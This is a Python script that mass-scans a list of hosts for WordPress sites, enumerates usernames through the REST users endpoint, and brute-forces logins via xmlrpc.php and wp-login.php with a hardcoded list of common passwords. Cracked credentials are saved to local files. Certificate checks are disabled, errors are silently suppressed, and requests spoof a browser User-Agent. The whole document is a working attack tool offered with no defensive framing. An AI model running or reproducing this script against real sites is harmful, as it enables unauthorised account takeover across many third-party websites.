import sys
import urllib3
import requests
from multiprocessing import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'humans_21909=1'}


def brute_force_login(sites, username, cookies):
    
    headers =\
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': f'humans_21909=1; {cookies}'}

    try:
        passwd = ['admin', 'pass', 'admin123', 'admin@123', 'admin1234', 'admin123456', 'admin@1234', '123456', 'password', 'passw0rd', '111111', 'password1', 'qwerty', 'qwerty1234', 'qwerty123456', 'qwertyuiop', 'Admin', 'Admin@1234', 'Admin1234', 'Admin@123']
        for z in passwd:
            pass1 = []
            pass1.append(z)
            pass2 = [f'{username}@{z}']
            passwordlist = pass1+pass2
            for passwords in passwordlist:

                data = {'log': username,
                'pwd': passwords,
                'wp-submit': 'Log+In',
                'testcookie': '1'}

                r = requests.post(f'{sites}wp-login.php', headers=headers, timeout=10, data=data, verify=False, allow_redirects=False)
                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                if f'{username}%' in r.headers['Set-Cookie']:
                    print(f'[Log in Success] >> {sites} - {username}::{passwords}')
                    with open('wp_crack_login_page.txt', 'a+') as output:
                        output.write(f'[Log in Success] >> {r.url} - {username}::{passwords}\n')
                else:
                    pass
    except:
        pass

def brute_force_xmlrpc(sites, username, cookies):

    headers =\
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': f'humans_21909=1; {cookies}'}

    try:
        passwd = ['admin', 'pass', 'admin123', 'admin@123', 'admin1234', 'admin123456', 'admin@1234', '123456', 'password', 'passw0rd', '111111', 'password1', 'Fucker123!!Dragon123~!', 'qwerty', 'qwerty1234', 'qwerty123456', 'qwertyuiop', 'Admin', 'Admin@1234']
        for z in passwd:
            pass1 = []
            pass1.append(z)
            pass2 = [f'{username}@{z}']
            passwordlist = pass1+pass2
            for passwords in passwordlist:     

                data = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, passwords)
                r = requests.post(f'{sites}xmlrpc.php', headers=headers, data=data, timeout=10, verify=False)
                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                if r.ok:
                    if 'isAdmin' in r.text:
                        print(f'[Log in success] >> {sites} - {username}::{passwords}')
                        with open('wp_crackxmlrpc.txt', 'a+') as output:
                            output.write(f'[Log in success] >> {sites} - {username}::{passwords}\n')
                if not r.ok:
                    print('Calling Page login bruteforce')
                    brute_force_login(sites, username, cookies)
    except:
        pass

def check_xmlrpc(sites, username, cookies):
    try:

        data = """<methodCall> <methodName>demo.sayHello</methodName><params></params></methodCall>"""
        r = requests.post(f'{sites}xmlrpc.php', data=data, headers=headers, verify=False, timeout=10)
        if r.ok:
            if 'Hello!' in r.text:
                brute_force_xmlrpc(sites, username, cookies)
            else:
                brute_force_login(sites, username, cookies)
        else:
            brute_force_login(sites, username, cookies)
    except:
        pass

def get_user(sites, cookies):
    try:
        r = requests.get('{}wp-json/wp/v2/users'.format(sites), timeout=10, headers=headers, verify=False)
        if r.ok:
            if 'slug' in r.text:
                username = r.json()[0]['slug']
                check_xmlrpc(sites, username, cookies)

        if r.status_code == 401:
            username = 'admin'
            check_xmlrpc(sites, username, cookies)
        else:
            pass
    except:
        pass

def check_if_wp(sites):
    try:
        keywords = ['wordpress', 's.w.org', 'action=lostpassword', 'wp-admin', 'Powered by WordPress']
        r = requests.get('{}wp-login.php'.format(sites), timeout=10, headers=headers, verify=False)
        if r.ok:
            if any(keyword in r.text for keyword in keywords):
                cookies = r.headers['Set-Cookie']
                get_user(sites, cookies)
    except:
        pass

def main(sites):
    try:
        r = requests.get('http://{}/'.format(sites), headers=headers, timeout=10, verify=False)
        if r.ok:
            check_if_wp(r.url)
        else:
            pass
    except:
        pass


if __name__=='__main__':
    try:
        with open(str(sys.argv[1])) as lists:
            list_urls = lists.read().splitlines()
            p = Pool(int(sys.argv[2]))
            p.map(main, list_urls)
            p.terminate()
            p.join()
    except:
        pass
